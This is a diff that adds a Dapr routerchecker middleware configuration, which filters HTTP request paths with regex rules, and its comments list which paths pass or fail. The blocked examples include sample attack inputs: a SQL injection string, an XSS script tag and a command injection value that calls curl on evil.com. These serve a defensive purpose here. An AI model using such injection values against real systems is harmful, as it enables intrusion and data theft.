@@ -1,0 +1,62 @@
+# Router Checker Middleware
+# Validates HTTP request paths using regex patterns
+# Blocks malicious or malformed requests before reaching services
+#
+# Usage: Apply FIRST in httpPipeline to filter bad requests
+
+apiVersion: dapr.io/v1alpha1
+kind: Component
+metadata:
+  name: routerchecker
+  namespace: default
+spec:
+  type: middleware.http.routerchecker
+  version: v1
+  metadata:
+  # Regex pattern that valid routes must match
+  # Requests not matching this pattern receive HTTP 403
+  - name: rule
+    value: "^[A-Za-z0-9/._-]+$"
+
+# This pattern allows:
+#   /v1.0/invoke/demo/method/hello       - PASS
+#   /v1.0/invoke/demo.default/method/api - PASS
+#   /v1.0/invoke/svc/method/user_info    - PASS
+#   /v1.0/invoke/svc/method/user-profile - PASS
+#
+# This pattern blocks:
+#   /method/cat password                 - FAIL (space)
+#   /method/" AND 1=1 --                 - FAIL (SQL injection)
+#   /method/"$(curl evil.com)            - FAIL (command injection)
+#   /method/<script>alert(1)</script>    - FAIL (XSS)
+
+---
+# Example: Strict alphanumeric only
+apiVersion: dapr.io/v1alpha1
+kind: Component
+metadata:
+  name: routerchecker-strict
+  namespace: default
+spec:
+  type: middleware.http.routerchecker
+  version: v1
+  metadata:
+  - name: rule
+    value: "^/v1\\.0/[a-z]+/[A-Za-z0-9._-]+/method/[A-Za-z0-9/_-]+$"
+
+# Recommended patterns by security level:
+#
+# Permissive (basic protection):
+#   ^[A-Za-z0-9/._-]+$
+#
+# Standard (blocks common attacks):
+#   ^[A-Za-z0-9/._-]+(?:\\?[A-Za-z0-9=&._-]+)?$
+#
+# Strict (Dapr API format only):
+#   ^/v1\\.0/(invoke|state|publish|bindings|secrets|actors)/[A-Za-z0-9._-]+
+#
+# Security benefits:
+# - Prevents SQL injection via URL
+# - Blocks command injection attempts
+# - Filters XSS payloads
+# - Reduces noise in logs and telemetry
